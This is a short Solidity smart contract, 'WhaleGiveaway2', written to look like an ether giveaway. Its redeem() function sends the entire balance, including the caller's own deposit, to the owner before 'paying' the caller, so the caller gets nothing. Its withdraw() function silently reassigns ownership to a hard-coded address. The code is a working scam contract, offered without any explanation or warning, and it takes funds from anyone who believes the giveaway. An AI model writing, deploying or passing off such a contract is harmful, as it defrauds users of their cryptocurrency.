pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public Owner = msg.sender;
    uint public constant minEligibility = 0.999001 ether;

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        Owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        require(adr.call.value(msg.value)(data));
    }
}